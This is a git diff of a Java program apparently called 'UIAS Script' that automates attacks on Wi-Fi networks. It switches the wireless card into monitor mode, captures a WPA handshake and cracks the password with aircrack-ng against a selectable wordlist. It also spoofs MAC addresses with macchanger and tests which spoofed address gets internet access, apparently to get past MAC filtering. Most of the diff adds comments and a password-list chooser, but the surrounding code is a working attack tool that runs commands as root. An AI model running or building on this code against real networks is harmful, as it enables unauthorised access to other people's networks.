@@ -1,4 +1,4 @@
-package com.company;
+package com.koursh.inbar;
 
 
 import java.io.*;
@@ -8,14 +8,38 @@ import java.util.Arrays;
 import java.util.Objects;
 import java.util.Scanner;
 
+/**
+ * UIAS Script
+ */
+
 class Main {
+    /**
+     * Scanner used to read user input
+     */
     private static final Scanner scanner = new Scanner(System.in);
+    /**
+     * Wireless Interface
+     */
     private static String wi = "wlp5s0";
+    /**
+     * Wireless Interface in monitor mode
+     */
     private static String mwi = wi + "mon";
+    /**
+     * Has monitor mode been started by script
+     */
     private static boolean monitorMde = false;
+    /**
+     * Script JAR file directory
+     */
     private static String scriptDIR;
 
-
+    /**
+     * UIAS interface
+     * @param args arg s is given so the script will only run setup and not start
+     * @throws IOException error
+     * @throws URISyntaxException error
+     */
     public static void main(String[] args) throws IOException, URISyntaxException {
         if (System.getProperty("os.name").startsWith("Windows")) {
             System.out.println("Sorry, windows isn't supported yet, please run from a vm.");
@@ -115,6 +139,12 @@ class Main {
                 System.out.println("press enter when done"); //wait until handshake file is created
                 scanner.nextLine();
 
+                try {
+                    Thread.sleep(100);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+
                 File[] tgscans = new File(scriptDIR + "tg").listFiles(pathname -> pathname.getAbsolutePath().endsWith("cap"));
                 assert tgscans != null;
                 Arrays.sort(tgscans);
@@ -123,7 +153,11 @@ class Main {
                 execute("chmod 777 " + lasttg_scan.getAbsolutePath(), true); //allow editing of file
                 System.out.println("got handshake");
 
-                executeNewWindow("aircrack-ng -l netpass -w " + scriptDIR + "rockyou.txt" + " -b " + bss + " " + lasttg_scan.getAbsolutePath(), true); //crack password and save password to file
+                String passwd_list = getPasswordList();
+
+                System.out.println("aircrack-ng -l netpass -w " + passwd_list + " -b " + bss + " " + lasttg_scan.getAbsolutePath());
+
+                executeNewWindow("aircrack-ng -l netpass -w " + passwd_list + " -b " + bss + " " + lasttg_scan.getAbsolutePath(), true); //crack password and save password to file
                 //TODO: add john the ripper custom password list generation
 
                 System.out.println("press enter when done");//wait for aircrack
@@ -170,6 +204,31 @@ class Main {
         }
     }
 
+    /**
+     * Get a password list
+     * @return selected password list
+     */
+    private static String getPasswordList() {
+        File lists = new File("passwd_lists");
+        File[] files = lists.listFiles();
+        int i=0;
+        System.out.println("Select password list: ");
+        for(File l: Objects.requireNonNull(files)){
+            i++;
+            System.out.println(i+") "+l.getName());
+        }
+        String pl =scanner.nextLine();
+//        if(pl.equals("c")){
+//
+//        }
+        return files[Integer.parseInt(pl)-1].getAbsolutePath();
+    }
+
+    /**
+     * Get details about network to attack
+     * @return bssid, essid, chanel
+     * @throws IOException error
+     */
 
     private static String[] getNetwork() throws IOException {
         startMonitorMode();
@@ -226,6 +285,9 @@ class Main {
         return new String[]{bss, ess, ch};
     }
 
+    /**
+     * Put wireless interface in monitor mode
+     */
     private static void startMonitorMode() {
         if (!monitorMde) { //if monitor mode is disabled
             execute("airmon-ng check kill", true); //kill all processes that could interfere with monitor mode
@@ -234,9 +296,19 @@ class Main {
         }
     }
 
+    /**
+     * Set monitor wireless card chanel
+     * @param ch chanel to set
+     */
     private static void setChanel(String ch) {
+        if (monitorMde){
         execute("sudo iwconfig " + mwi + " channel " + ch, true); //set monitor wireless card chanel
+             }
     }
+
+    /**
+     * Revert wireless interface into standard mode
+     */
 
     private static void stopMonitorMode() {
         if (monitorMde) {
@@ -245,6 +317,11 @@ class Main {
             monitorMde = false;
         }
     }
+
+    /**
+     * Check that the programs dependencies are installed - otherwise prompt the user to install the programs dependencies and quit
+     * @throws IOException error
+     */
 
     private static void checkdep() throws IOException {
         System.out.println("checking dep");
@@ -287,6 +364,12 @@ class Main {
     }
 
 
+    /**
+     * Check that a certain package dependency is installed
+     * @param packageS package to check
+     * @return weather the package is installed
+     */
+
     private static boolean checkpackage(String packageS) {
         ArrayList<String> pkg_stat = execute("which " + packageS, false); //check if package is installed via which command
         boolean installed = pkg_stat.size() > 0;
@@ -295,6 +378,12 @@ class Main {
     }
 
 
+    /**
+     * Run a bash command
+     * @param command command to execute
+     * @param sudo whether to execute as root
+     * @return ArrayList of output - each entry is a line <p>note that first std:out is read, then std:error</p>
+     */
     private static ArrayList<String> execute(String command, boolean sudo) {
         if (sudo) {
             command = "pkexec " + command; // if sudo is required append pkexec to the start(graphical request for sudo)
@@ -325,6 +414,12 @@ class Main {
         return out;
     }
 
+    /**
+     * Execute command in a window that can be interacted with by the user
+     * @param command command to execute
+     * @param sudo whether to execute as root
+     */
+
     private static void executeNewWindow(String command, boolean sudo) {
         if (sudo) { //pkexce doesn't work well with terminal
             execute("sudo x-terminal-emulator -e " + command, false); //execute command in a new terminal
@@ -333,6 +428,11 @@ class Main {
         execute("x-terminal-emulator -e " + command, false);//execute command in a new terminal
     }
 
+    /**
+     * Change wireless interface mac address
+     * @param mac new mac address
+     */
+
     private static void change_mac(String mac) {
         execute("ifconfig " + wi + " down && pkexec macchanger -m " + mac + " " + wi + "&& pkexec ifconfig " + wi + " up", true);//bring down the network card, change mac, bring it back up
 
@@ -340,6 +440,11 @@ class Main {
         execute("nmcli radio wifi on", true);
     }
 
+    /**
+     * Detect if a mac address can access the internet
+     * @param mac mac address to try
+     * @return if mac has internet access
+     */
     private static boolean trymac(String mac) {
         change_mac(mac); //change mac address
         boolean conected = false; //try 5 times to check connection to network
